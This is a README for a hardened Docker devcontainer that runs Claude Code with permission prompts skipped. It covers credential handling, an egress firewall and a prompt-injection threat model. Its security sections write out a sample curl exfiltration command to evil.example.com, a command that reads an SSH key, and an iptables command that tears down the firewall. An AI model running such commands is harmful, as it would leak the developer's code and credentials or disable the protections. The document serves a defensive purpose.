# Devcontainer Base Image: Hardened Python Environment with Claude Code

This repository contains the shared base Docker image and scripts for hardened Python dev containers. It provides an isolated, firewall-restricted development environment designed for use with Neovim and Claude Code, with strong protections against prompt injection attacks that attempt to exfiltrate credentials or source code.

Individual service repositories inherit from this base image and add only their service-specific configuration. See [Using the Base Image in a Service](#using-the-base-image-in-a-service) for how to set that up.

## Repository Structure

```
devcontainer-base/
├── base-image/
│   ├── Dockerfile
│   ├── init-firewall.sh
│   ├── refresh-firewall-domains.sh
│   ├── dev-post-start.sh        # canonical post-start logic (baked into image)
│   ├── print-setup-hint.sh      # one-time setup hint (baked into image)
│   └── skills/                  # Claude skills baked into the image (see Claude skills)
├── scripts/
│   ├── dev-container-helpers.sh # host shell helpers (dcup, dcdanger, …)
│   └── post-start.sh            # thin wrapper copied into each service
├── templates/
│   ├── devcontainer.json
│   ├── firewall-extras.sh.example
│   └── Dockerfile.example
└── README.md
```

**`base-image/`** — The Dockerfile plus everything baked into the shared image: the firewall scripts, the canonical post-start logic (`dev-post-start.sh`), and the setup hint. This image also includes Python, Neovim, Node.js, Claude Code, firewall tooling, and common Python dev tools (ruff, pyright, pytest, ipython, debugpy).

**`scripts/`** — Files that live with each service. `dev-container-helpers.sh` is sourced on the **host**. `post-start.sh` is a **thin wrapper** copied into each service's `.devcontainer/`; it just `exec`s the baked `/usr/local/bin/dev-post-start.sh`, so startup-logic changes ship via a `docker pull` of a new base image rather than re-copying scripts into every service. See [How post-start works](#how-post-start-works).

**`templates/`** — Example files for setting up a new service to use the base image.

---

## Building and Publishing the Base Image

### Prerequisites

- Docker
- AWS CLI (authenticated with push access to the ECR repository)

### Build

```bash
cd base-image
docker build -t your-registry/devcontainer-base:latest .
```

To pin a specific Claude Code version:

```bash
docker build --build-arg CLAUDE_CODE_VERSION=2.1.52 \
  -t your-registry/devcontainer-base:latest .
```

To use a different Python version:

```bash
docker build --build-arg PYTHON_VERSION=3.12 \
  -t your-registry/devcontainer-base:3.12 .
```

### Push to ECR

```bash
# Authenticate Docker with ECR (once per session)
aws ecr get-login-password --region <region> | docker login --username AWS --password-stdin <registry-url>

# Push the image
docker push your-registry/devcontainer-base:latest
```

Tag images with dates or semver so services can pin to a known-good version:

```bash
docker tag your-registry/devcontainer-base:latest your-registry/devcontainer-base:2026-04-06
docker push your-registry/devcontainer-base:2026-04-06
```

### When to Rebuild

Rebuild and push a new base image when:

- Neovim, Node.js, or Claude Code versions need updating
- Python dev tools (ruff, pyright, etc.) need updating
- The firewall script changes (new default domains, logic fixes)
- New system packages are needed across all services

You do NOT need to rebuild the base image when:

- A service's Python dependencies change (handled by `pip install` at container creation)
- A service needs different forwarded ports (configured in `devcontainer.json`)
- Mounts or environment variables change (configured in `devcontainer.json`)

---

## Using the Base Image in a Service

### 1. Create the service's `.devcontainer/` directory

Copy the scripts and templates into your service repo:

```bash
mkdir -p your-service/.devcontainer

# Copy the thin post-start wrapper (it just execs the baked dev-post-start.sh)
cp scripts/post-start.sh your-service/.devcontainer/

# Copy and rename the templates
cp templates/Dockerfile.example your-service/.devcontainer/Dockerfile
cp templates/devcontainer.json.example your-service/.devcontainer/devcontainer.json
```

`post-start.sh` is a one-line wrapper around the baked `/usr/local/bin/dev-post-start.sh` — you copy it in once and never touch it again. (The setup hint and all real startup logic live in the base image now, so there's no `print-setup-hint.sh` to copy.)

Edit `devcontainer.json` to set the service name, `postCreateCommand`, and `forwardPorts` for your service.

Edit the `Dockerfile` if your service needs additional system packages. If it doesn't, the one-line `FROM` is all you need.

Your service's `.devcontainer/` should look like this:

```
your-service/
├── .devcontainer/
│   ├── devcontainer.json
│   ├── Dockerfile
│   ├── firewall-extras.sh       # (optional) service-specific whitelisted domains
│   ├── post-start.local.sh      # (optional) service-specific startup steps
│   └── post-start.sh            # thin wrapper → /usr/local/bin/dev-post-start.sh
└── ... your code ...
```

### 2. Set up the host environment (one-time per developer)

Install the helper script:

```bash
cp scripts/dev-container-helpers.sh ~/.local/bin/
echo '[ -f ~/.local/bin/dev-container-helpers.sh ] && source ~/.local/bin/dev-container-helpers.sh' >> ~/.bashrc
source ~/.bashrc
```

Add the required environment variables to `~/.bashrc` or `~/.zshrc`:

```bash
# Full path to your shared notes directory
export NOTES_PATH="/home/yourusername/projects/notes"

# Full path to your EC2 SSH key
export EC2_KEY_PATH="/home/yourusername/path/to/your-ec2-key.pem"

# The EC2 bastion host for database tunneling.
# NOTE: this is intentionally DEV_EC2_HOST, not EC2_HOST. Services load their
# own EC2_HOST from their .env (per environment) via python-dotenv; injecting
# EC2_HOST from the host would shadow that (dotenv won't override an existing
# env var), so the dev bastion gets its own name.
export DEV_EC2_HOST="ec2-xx-xx-xx-xx.compute-1.amazonaws.com"

# If your IAM user has MFA enabled (recommended)
export AWS_MFA_SERIAL="arn:aws:iam::123456789012:mfa/your-username"
```

Create the shared notes directory if it doesn't exist:

```bash
mkdir -p ~/projects/notes
```

Ensure the Claude config directory exists:

```bash
mkdir -p ~/.claude
```

### 3. Authenticate Docker with the container registry

If the base image is hosted on a private registry (e.g., ECR), authenticate before your first build:

```bash
aws ecr get-login-password --region <region> | docker login --username AWS --password-stdin <registry-url>
```

ECR tokens expire after 12 hours. If `dcup` fails with an image pull error, re-run the login command.

### 4. Build and start

```bash
cd your-service
dcup
```

### 5. Daily workflow

```bash
cd your-service
dcup          # start the container
dcdanger      # launch Claude Code (with AWS creds injected)
dcnvim        # open Neovim (with AWS creds injected)
dcshell       # get a bash shell (with AWS creds injected)
dcrefresh     # manually refresh the STS token if it expires mid-session
```

---

## What's in the Base Image

| Component | Purpose |
|---|---|
| Python 3.13 (slim) | Base runtime |
| Neovim | Editor |
| Node.js 22 | Required by some Neovim tooling |
| Claude Code (native binary) | AI coding assistant |
| ruff, pyright, pytest, ipython, debugpy | Python dev tools |
| iptables, ipset, iproute2, dnsutils, jq | Firewall tooling |
| cron | Runs the periodic DNS refresh for the firewall |
| curl, git, tmux, ripgrep, fd-find, unzip | Core dev utilities |
| `init-firewall.sh` | Egress firewall script (baked in at `/usr/local/bin/`) |
| `refresh-firewall-domains.sh` | Periodic DNS re-resolution of service domains (baked in at `/usr/local/bin/`) |
| `dev-post-start.sh` | Canonical post-start logic run on every container start (baked in at `/usr/local/bin/`) |
| `print-setup-hint.sh` | One-time setup hint shown on first start (baked in at `/usr/local/bin/`) |
| Non-root `dev` user (UID 1000) | All work runs unprivileged |

---

## AWS Credentials: How It Works

The dev container does NOT mount `~/.aws` from your host. Instead, short-lived STS session tokens are generated on the host and passed into the container as environment variables.

The flow is:

1. You run `dcdanger` (or `dcnvim`, `dcshell`, etc.)
2. The helper script calls `aws sts get-session-token` on your host using your IAM user's long-lived credentials
3. If MFA is enabled, it prompts for your TOTP code
4. STS returns a temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken`
5. These are passed into the container via `env` on `devcontainer exec`
6. Boto3 picks them up automatically from environment variables

Your long-lived IAM access keys never enter the container. The temporary credentials expire after a configurable duration (default: 4 hours, adjustable via `export DC_TOKEN_DURATION=28800` for 8 hours). Even if a prompt injection reads the environment variables inside the container, the egress firewall blocks any exfiltration attempt, and the credentials expire shortly after.

## EC2 SSH Tunnel: How It Works

Some services create an SSH tunnel to an EC2 bastion host to reach the database. This requires two things inside the container:

1. **The EC2 SSH key**: mounted read-only from the host to `/home/dev/.ssh/ec2-key` inside the container. Only this single key is mounted — not your entire `~/.ssh` directory.
2. **Network access to the EC2 host**: the firewall whitelists `$DEV_EC2_HOST` alongside the other allowed domains (and AWS EC2 CIDRs cover bastions generally).

The `EC2_PRIVATE_KEY_PATH` environment variable is set in `devcontainer.json` to point to the mounted key, so no code changes are needed.

---

## Security Model

This dev container is hardened against a specific threat: **prompt injection attacks against agentic coding tools**. The scenario it protects against is as follows. You run Claude Code with `--dangerously-skip-permissions`, which allows it to execute shell commands without confirmation. During a task, Claude Code encounters a malicious prompt (embedded in a web page, package README, issue tracker, or any text it processes). That prompt instructs Claude Code to read sensitive files and exfiltrate them to an attacker-controlled server.

The container defends against this with two independent layers.

### Layer 1: No credentials to steal

The container only mounts what is strictly necessary:

| Mounted (accessible inside container) | Why |
|---|---|
| `~/.config/nvim` | Your Neovim configuration |
| `~/.local/share/nvim` | Neovim plugin and state data |
| `~/.claude` and `~/.claude.json` | Claude Code auth token and config |
| `~/.ssh/<EC2_KEY_NAME>` (read-only) | Single SSH key for database tunnel |
| Your project directory | Mounted as `/workspace` (this is your code) |
| Named volume for pip cache | Speeds up pip installs across rebuilds |

Everything else on your host is invisible to the container:

| NOT mounted (invisible inside container) | What it protects |
|---|---|
| `~/.ssh` (full directory) | All other SSH private keys |
| `~/.aws` | AWS access keys and session tokens |
| `~/.config/gcloud` | Google Cloud credentials |
| `~/.kube` | Kubernetes cluster credentials |
| `~/.gnupg` | GPG private keys |
| `~/.netrc` | Plaintext login credentials |
| `~/.env`, `.env` files | API keys, database passwords |

If a prompt injection runs `cat ~/.ssh/id_ed25519` inside the container, it gets "file not found." The file simply doesn't exist in the container's filesystem.

AWS credentials are passed as environment variables (not mounted files) and are short-lived STS tokens that expire within hours.

### Layer 2: Egress firewall (network lockdown)

Even though credentials aren't mounted, your **source code** is — it has to be, since that's what you're working on. The firewall prevents exfiltration of source code or any other data by restricting outbound network access to a strict whitelist.

The container can ONLY reach:

| Domain | Purpose |
|---|---|
| `api.anthropic.com` | Claude Code API calls |
| `sentry.io` | Claude Code error reporting (optional) |
| `statsig.anthropic.com` | Claude Code telemetry (optional) |
| `statsig.com` | Claude Code telemetry (optional) |
| `registry.npmjs.org` | Node package registry (optional) |
| `github.com` | Claude plugin marketplace (optional) |
| `$DEV_EC2_HOST` | SSH tunnel to database |
| AWS service CIDRs (us-east-1) | SSM, S3, EC2, STS API endpoints |
| Docker host network | Port forwarding (OAuth, app ports) |
| localhost | LSP servers, local tools |

All other outbound traffic is blocked and rejected. A prompt injection that tries `curl https://evil.example.com/exfil -d "$(cat /workspace/secrets.py)"` will fail immediately with a connection rejected error.

---

## How post-start works

Every container start runs `postStartCommand` from the service's `devcontainer.json`:

```jsonc
"postStartCommand": "bash .devcontainer/post-start.sh"
```

This runs **inside the container** (unlike `initializeCommand`, which runs on the host). The service repo is bind-mounted at `/workspace`, so `.devcontainer/post-start.sh` is just a mounted file the container executes.

That file is a **thin wrapper** — it contains no logic, only a handoff to the baked script:

```bash
exec bash /usr/local/bin/dev-post-start.sh
```

`dev-post-start.sh` lives **in the base image**, so it's part of the container's filesystem and reachable from the same command. The full chain:

```
postStartCommand (in container)
  → /workspace/.devcontainer/post-start.sh   (mounted wrapper — copy once, never changes)
      → /usr/local/bin/dev-post-start.sh      (baked — the real logic, updated via docker pull)
          → init-firewall.sh, DNS-refresh cron, plugin workarounds, …
          → /workspace/.devcontainer/post-start.local.sh   (optional, per-service)
```

**Why this split:** startup logic used to live in a full `post-start.sh` copied into every service, so each change had to be re-copied across all of them (and a `docker pull` alone would silently miss it). Now the logic lives in the image: change `dev-post-start.sh`, rebuild, push, and every service picks it up on `docker pull`. The per-service wrapper never changes.

### Service-specific startup steps

If a service needs custom startup work, add a `post-start.local.sh` to its `.devcontainer/`. `dev-post-start.sh` runs it automatically at the end if present:

```bash
# your-service/.devcontainer/post-start.local.sh
nohup python scripts/dev_mock_sqs.py >/tmp/mocksqs.log 2>&1 &
```

This keeps service-specific logic isolated from the shared script, so base updates never conflict with it.

### Migrating an existing service to the wrapper

Older services carry a full `post-start.sh` (and a `print-setup-hint.sh`). To move them to the baked model, do this once per service:

```bash
# Replace the full post-start.sh with the thin wrapper
cp /path/to/slc_be_devcontainer/scripts/post-start.sh .devcontainer/post-start.sh

# The setup hint is baked into the image now — remove the per-service copy
rm -f .devcontainer/print-setup-hint.sh
```

No `devcontainer.json` change is needed — `postStartCommand` still points at `.devcontainer/post-start.sh`. After this, the service tracks startup changes through the base image automatically. (Requires a base image that includes `dev-post-start.sh` — rebuild/pull first.)

---

## Claude skills

Claude Code skills come from two sources, merged at startup:

1. **Baked-in skills** — shipped in the base image under `/opt/claude-skills/`. Author them in this repo at `base-image/skills/<skill-name>/SKILL.md`; they reach every service via `docker pull`, no per-service copy. (See `base-image/skills/README.md`.)
2. **Host user-scope skills** — the developer's own `~/.claude/skills/`, flattened on the host by `initializeCommand` into `~/.cache/.claude-skills-resolved` and mounted read-only at `~/.claude/skills-host`.

> **Do not add `rm -rf` to the host-skills resolve step.** `~/.cache/.claude-skills-resolved` is a *single shared* host dir that every service bind-mounts. A bind mount is pinned to the directory's inode, so `rm -rf` + `mkdir` in one service's `initializeCommand` destroys that inode and swaps in a new one — emptying the skills dir in every *other* service's already-running container. Use an in-place `cp -rL` (clobber, no `rm`, no `-n`): it overwrites files in place so live mounts stay intact and edits propagate. The only thing it won't do is prune skills you delete on the host (they linger). If you need deletion-pruning, give each service its own resolve dir keyed by `${localWorkspaceFolderBasename}` instead of sharing one.

`dev-post-start.sh` copies both into a `tmpfs` at `~/.claude/skills` (the dir Claude Code actually reads, since `CLAUDE_CONFIG_DIR=/home/dev/.claude`):

```
/opt/claude-skills/       (baked into image)        ─┐
                                                      ├─► merge ─► ~/.claude/skills  (tmpfs)
~/.claude/skills-host/     (host user scope, RO)     ─┘
```

The merge is whole-skill-dir replacement into a single directory, so Claude Code's cross-scope precedence never applies — the copy order decides name collisions. The policy is **host-wins**: a developer's same-named host skill overrides the baked one, so baked skills act as overridable defaults. To make baked skills authoritative instead, swap the loop order in `dev-post-start.sh`. Nothing is written back to the host's `~/.claude/skills`, and nothing lands in `/workspace`.

Docker mounts a `tmpfs` **root-owned**, but the merge runs as the non-root `dev` user, so `dev-post-start.sh` `chown`s `~/.claude/skills` to the current user before copying — otherwise the merge fails with `Permission denied`. (Equivalent alternative if you'd rather keep it declarative: add `tmpfs-mode=1777` to the tmpfs mount in `devcontainer.json`.)

**Per-service rollout:** the merge logic is in the base image (propagates via `docker pull`), but the two skills mounts live in each service's `devcontainer.json`. A service must adopt the `skills-host` + `tmpfs` mounts (see the template) **at the same time** it pulls the new image — the old single read-only mount on `~/.claude/skills` would make the merge fail to write.

### Global `CLAUDE.md` overlay

The same flatten-and-mount trick handles the user-scope `~/.claude/CLAUDE.md`. The host file may be a symlink (e.g. into a dotfiles repo) whose target isn't mounted in the container, so `initializeCommand` resolves it to a real file at `~/.cache/.claude-user-CLAUDE.md` and mounts that read-only onto `/home/dev/.claude/CLAUDE.md`:

```jsonc
// initializeCommand
… && touch ~/.cache/.claude-user-CLAUDE.md && cp -L ~/.claude/CLAUDE.md ~/.cache/.claude-user-CLAUDE.md 2>/dev/null || true

// mounts
"source=${localEnv:HOME}/.cache/.claude-user-CLAUDE.md,target=/home/dev/.claude/CLAUDE.md,type=bind,readonly",
```

The `touch` is required: a bind mount whose source file is missing makes Docker silently create an empty **directory** at that path, which then mounts as a directory onto `CLAUDE.md` and breaks it. `touch` guarantees the source exists as a file. The `cp -L` clobbers (no `-n`), so edits to the host `CLAUDE.md` propagate on every rebuild.

---

## How the Firewall Works

The firewall script (`init-firewall.sh`) runs every time the container starts via `postStartCommand`. It uses `iptables` and `ipset` to create a default-deny egress policy — all outbound traffic is blocked unless it's going to an explicitly whitelisted destination. Here's what happens step by step.

### Phase 1: Preserve Docker internals

Docker uses an embedded DNS server at `127.0.0.11` for container name resolution. The script saves any existing NAT rules related to this address before flushing all firewall rules, then restores them afterward. Without this, DNS resolution inside the container would break.

### Phase 2: Allow foundational traffic

Before applying any restrictions, the script permits traffic that everything else depends on: outbound DNS (both UDP and TCP port 53) so domain names can be resolved, localhost/loopback so LSP servers and local tools work, and the Docker host network (auto-detected via the default gateway) so port forwarding works for things like Claude Code's OAuth browser flow and your application ports.

TCP port 53 is allowed alongside UDP because DNS responses larger than 512 bytes (common for CDN-backed domains that return many records) fall back to TCP. If only UDP were permitted, those lookups would silently fail even though tools like `dig` — which may use a different code path — appeared to work.

The script also locks down IPv6 as one of its first steps. The firewall is built entirely on `iptables`/`ipset`, which only govern IPv4. `curl` and the glibc resolver prefer IPv6 (AAAA records) when a domain is dual-stack — as CloudFront-backed domains are — so leaving IPv6 open would let that traffic take a completely unfiltered path, defeating the egress controls.

Note the mechanism: you cannot disable the IPv6 stack with `sysctl` inside the container, because Docker mounts `/proc/sys` read-only — `sysctl -w net.ipv6.conf.*.disable_ipv6=1` fails with "permission denied" even as root with `NET_ADMIN`. Instead, the script uses `ip6tables` (which *does* work at runtime under `NET_ADMIN`) to drop all IPv6 traffic except loopback, rejecting outbound so tools fail fast and fall back to the filtered IPv4 path.

### Phase 3: Resolve and whitelist domains

The script maintains an `ALLOWED_DOMAINS` array of hostnames that the container is permitted to reach. For each domain, it runs `dig` to resolve the current A records and adds the resulting IP addresses to an `ipset` hash called `allowed-domains`. If a domain is already a raw IP address, it's added directly.

This is where the DNS-based limitation comes in: the IPs are resolved once at container start. If a service like `api.anthropic.com` rotates to new IPs during a long session, outbound connections to that service may fail until you restart the container. In practice this is rare for typical dev sessions lasting a few hours. Service-specific `EXTRA_DOMAINS` (see Phase 6) are the exception — they're re-resolved periodically to handle CDN IP rotation.

### Phase 4: Whitelist AWS service CIDRs

AWS services (SSM, S3, EC2, STS) rotate their IP addresses frequently and unpredictably — far more than a typical web service. Resolving `ssm.us-east-1.amazonaws.com` once at startup would break within minutes as AWS shifts traffic across its infrastructure.

To handle this, the script fetches the official AWS IP ranges from `https://ip-ranges.amazonaws.com/ip-ranges.json` (a well-known, stable endpoint maintained by AWS). It then extracts the CIDR blocks for the specific services and region your container needs — currently `SSM`, `S3`, `EC2`, and `AMAZON` in `us-east-1` — and adds all of them to the `ipset` whitelist.

This adds a few hundred CIDRs covering the full range of IPs those AWS services might use in your region. It's broader than the per-domain approach used for other services, but it's still scoped: only the listed services in the listed region are whitelisted, and these are AWS infrastructure endpoints, not arbitrary internet destinations. A prompt injection cannot use `ssm.us-east-1.amazonaws.com` as an exfiltration channel because it requires valid AWS credentials to do anything with those endpoints.

The `AMAZON` service prefix is included because it's a superset that covers shared AWS infrastructure (load balancers, edge nodes) that other services depend on. Without it, some legitimate AWS API calls may fail because the actual IP the request hits isn't tagged under the specific service prefix.

### Phase 5: Lock down and verify

After building the whitelist, the script sets the default `iptables` policies to `DROP` for all chains (INPUT, FORWARD, OUTPUT). It then adds rules to allow established/related connections (so responses to approved outbound requests can come back in) and to allow outbound traffic only to IPs in the `allowed-domains` ipset.

Everything else hits a `REJECT` rule (not `DROP`) with `icmp-admin-prohibited`. The distinction matters: `REJECT` sends an immediate error response back to the calling process, so tools like `curl` fail fast with a clear error. `DROP` would silently swallow packets, causing tools to hang for their full timeout duration before failing — which makes debugging harder and slows down prompt injection attempts that are probing for connectivity.

Finally, the script runs verification checks to confirm that the firewall is working correctly: it confirms that `example.com` and `webhook.site` (common exfiltration test targets) are blocked, that `api.anthropic.com` is reachable, and that the EC2 bastion host (if configured) is reachable on port 22. If any critical check fails, the script exits with a non-zero code, which causes `postStartCommand` to fail and prevents the container from being used in an insecure state.

### Phase 6: Periodic DNS refresh (CDN IP rotation)

Phases 1–5 run once, at container start. That leaves a gap for CDN-fronted domains: CloudFront (and similar CDNs) rotate their IP addresses frequently, so a domain resolved at startup can point to IPs that are no longer valid an hour later, and outbound connections to it break mid-session.

To handle this, `dev-post-start.sh` installs a cron job (in root's crontab) that runs `refresh-firewall-domains.sh` every 5 minutes. That script re-resolves the service's `EXTRA_DOMAINS` (from `firewall-extras.sh`) and adds any newly-seen IPs to the `allowed-domains` ipset. It is **add-only** — stale IPs are never removed. Leaving them is safe: the CDN no longer routes traffic through them, so they can't be used for exfiltration, and removing them could tear down in-flight connections.

A few deliberate scope choices:

- **Only `EXTRA_DOMAINS` are refreshed**, not the base `ALLOWED_DOMAINS`. The base domains (e.g. `api.anthropic.com`) rarely rotate within a single session, and keeping the refresh scoped to each service's explicitly-opted-in domains avoids broadening the whitelist.
- **Dynamic re-resolution, not CIDR allowlisting.** Whitelisting all CloudFront CIDRs would open the container to *any* CloudFront-fronted domain, weakening the exfiltration defense. Re-resolving only the whitelisted domains keeps the allowlist tight. (AWS service endpoints are handled by CIDR instead — see Phase 4 — because they are AWS infrastructure that already requires valid credentials to be useful.)
- **Non-CDN domains are no-ops.** Domains with stable IPs (e.g. `bitbucket.org`) simply re-resolve to the same addresses, so there's no harm in refreshing them too — one less list to maintain.

If a service defines no `firewall-extras.sh`, the refresh script exits immediately and the cron job is a no-op.

### Adding domains to the default whitelist

To add domains for all services, edit the `ALLOWED_DOMAINS` array in `base-image/init-firewall.sh`, rebuild, and push the base image.

### Adding domains for a single service

If a service needs to reach additional domains beyond the base whitelist, create a `firewall-extras.sh` file in the service's `.devcontainer/` directory:

```bash
# .devcontainer/firewall-extras.sh
#
# Service-specific domains to add to the firewall whitelist.
# This file is sourced by the base image's init-firewall.sh — it does
# not replace it. Add domains your service needs beyond the base set.
#
# Each domain you add is a potential vector for prompt injection
# content, so add only what you genuinely need.

EXTRA_DOMAINS=(
    "your-atlassian-instance.atlassian.net"
    "bitbucket.org"
    # "pypi.org"
    # "files.pythonhosted.org"
)
```

The base image's firewall script automatically checks for this file at `/workspace/.devcontainer/firewall-extras.sh` and appends any `EXTRA_DOMAINS` to the whitelist. No rebuild of the base image is needed — just restart the container:

```bash
dcup
```

This file is safe to commit to the service repo since it only contains domain names, not firewall logic.

### Fully replacing the firewall script

If you need to change the firewall logic itself (not just add domains), you can place a full copy of `init-firewall.sh` in the service's `.devcontainer/` directory. The baked `dev-post-start.sh` checks for a local copy first — if one exists, it replaces the base image's version before running it. If no local copy exists, the base image's version runs as usual.

```bash
# Extract the current firewall script from the running container
dcexec cat /usr/local/bin/init-firewall.sh > .devcontainer/init-firewall.sh

# Edit it — modify the firewall logic as needed
vim .devcontainer/init-firewall.sh

# Restart the container to pick up the changes
dcup
```

To revert to the standard firewall, delete the local copy and restart:

```bash
rm .devcontainer/init-firewall.sh
dcup
```

If the override is temporary or personal, gitignore it:

```bash
echo '.devcontainer/init-firewall.sh' >> .gitignore
```

### Changing the AWS region or services

If your infrastructure is in a different region or you need additional AWS services, edit the variables near the AWS CIDR section of `init-firewall.sh`:

```bash
AWS_REGION="us-east-1"
AWS_SERVICES=("SSM" "S3" "EC2" "AMAZON")
```

Change `AWS_REGION` to match your infrastructure. Add service prefixes to `AWS_SERVICES` if you need access to additional AWS services (the valid prefixes are listed in the [AWS IP ranges documentation](https://docs.aws.amazon.com/general/latest/gr/aws-ip-ranges.html)). Keep `AMAZON` in the list — removing it will break connectivity to shared AWS infrastructure that other services depend on.

---

## What This Does NOT Protect Against

No security setup is perfect. Be aware of these remaining risks:

**Source code modification.** A prompt injection can still modify your code — inserting backdoors, weakening security checks, or introducing subtle bugs. The firewall prevents exfiltration but not tampering. Always review changes before committing (which you do from the host).

**Claude auth token.** The `~/.claude` mount means a prompt injection could read your Claude Code auth token. The blast radius is limited to someone making API calls as you to Anthropic, which is much smaller than SSH or AWS credential theft.

**EC2 SSH key.** The mounted EC2 key is read-only and the firewall limits where SSH connections can go (only `$DEV_EC2_HOST`, plus AWS EC2 CIDRs). A prompt injection cannot exfiltrate the key to an external server, but it could theoretically use it to SSH into the bastion host.

**Short-lived AWS credentials in environment.** A prompt injection could read the STS token from environment variables. However, the egress firewall blocks exfiltration, and the token expires within hours. This is a significant improvement over mounting long-lived `~/.aws` credentials.

**Container escape.** This setup assumes Docker's container isolation holds. Container escapes are rare but not impossible. The `NET_ADMIN` and `NET_RAW` capabilities required for the firewall are additional kernel capabilities granted to the container, though they are used here to restrict rather than expand access.

**DNS-based firewall limitations.** The firewall resolves domain names to IP addresses at container start time. If a base whitelisted service (like `api.anthropic.com`) rotates its IPs during a long session, connections may break until the container is restarted. In practice this rarely matters for typical dev sessions. Two categories are handled differently and are not affected: AWS services use CIDR ranges (see Phase 4), and service-specific `EXTRA_DOMAINS` are re-resolved every 5 minutes by a cron job (see Phase 6) to absorb CDN IP rotation.

**No internet research.** Because the firewall blocks general internet access, Claude Code cannot browse documentation, search the web, or fetch resources from arbitrary URLs. It operates using only its training knowledge and the contents of your project. If you need Claude to reference external information, look it up on your host and paste the relevant content into your prompt.

---

## The `--cap-add` Flags Explained

The `devcontainer.json` includes `--cap-add=NET_ADMIN` and `--cap-add=NET_RAW`. These Docker capabilities allow the container to configure its own network — specifically, to run `iptables` and `ipset`. Without them, the firewall script would fail with "permission denied."

This might seem counterintuitive: you're granting extra capabilities to make the container *more* restrictive. The key distinction is that these capabilities allow the container to restrict its own outbound traffic. They do not grant the container any additional access to the host system or host network.

## The Sudoers Configuration Explained

The firewall must run as root because `iptables` and `ipset` require it. To allow that, the Dockerfile adds an explicit sudoers entry scoped to the firewall script:

```
dev ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
```

The original intent of this narrow entry was for the `dev` user to be able to run *only* the firewall script as root, and nothing else.

**However, that is not the effective configuration.** The `common-utils` devcontainer feature (declared in `devcontainer.json`) also provisions the `dev` user and, by default, grants it broad passwordless sudo via a separate file at `/etc/sudoers.d/dev`:

```
dev ALL=(root) NOPASSWD:ALL
```

The result is that `dev` can run **any** command as root. You can confirm this inside a running container with `sudo -l`. The base image's own `dev-post-start.sh` relies on this broad access (it uses `sudo cp`, `sudo mkdir`, `sudo crontab`, `sudo cron`, etc.), as does the periodic DNS refresh cron setup.

### Security implication

This weakens Layer 2 (the egress firewall). Because Claude Code runs as `dev` — and under `dcdanger` it runs with `--dangerously-skip-permissions` — a prompt injection could in principle run `sudo iptables -F && sudo iptables -P OUTPUT ACCEPT` to tear down the firewall and then exfiltrate freely. The narrow `init-firewall.sh`-only sudoers entry does **not** prevent this, because the broader `common-utils` grant supersedes it.

If you want the firewall to be tamper-resistant from inside the container, the broad grant must be removed and `dev-post-start.sh` / the cron setup reworked to use narrowly-scoped sudoers entries (or run from a root-owned mechanism the `dev` user can't modify). Until then, treat the firewall as a guardrail against *accidental or naive* exfiltration, not as a hard boundary against an adversary that specifically targets it.

All non-privileged work (Claude Code, Neovim, Python, your code) still runs as the unprivileged `dev` user.

---

## Helper Commands Reference

These commands are available after sourcing `dev-container-helpers.sh`:

| Command | Description |
|---|---|
| `dcup` | Start the dev container (optionally pass a workspace path) |
| `dcdanger` | Launch Claude Code with `--dangerously-skip-permissions` and AWS creds |
| `dcnvim` | Open Neovim with AWS creds injected |
| `dcshell` | Get a bash shell with AWS creds injected |
| `dcrefresh` | Force-refresh the cached STS token |
| `dcexec <cmd>` | Run any command inside the container with AWS creds |

### Configuration variables

Set these on your host before sourcing the helpers:

| Variable | Required | Description |
|---|---|---|
| `NOTES_PATH` | Yes | Full path to your shared notes directory |
| `EC2_KEY_PATH` | Yes | Full path to your EC2 SSH key file |
| `DEV_EC2_HOST` | Yes | EC2 bastion hostname or IP for the dev DB tunnel (named distinctly from the service's own `EC2_HOST`, which it loads from `.env`) |
| `AWS_MFA_SERIAL` | No | Your IAM MFA device ARN (prompted for TOTP if set) |
| `DC_TOKEN_DURATION` | No | STS token lifetime in seconds (default: 14400 = 4 hours) |
| `DC_WORKSPACE` | No | Default workspace folder (default: current directory) |
| `AWS_DEFAULT_REGION` | No | AWS region (default: us-east-1) |

---

## Stopping and Restarting

```bash
# Stop the container (preserves state)
docker stop $(docker ps -q --filter "label=devcontainer.local_folder=$(pwd)")

# Start it again (firewall re-initializes automatically)
dcup
```

## Rebuilding After Config Changes

If you modify the service's Dockerfile or devcontainer.json:

```bash
devcontainer up --workspace-folder . --build-no-cache
```

To delete the existing container and rebuild:

```bash
devcontainer up --workspace-folder . --remove-existing-container --build-no-cache
```
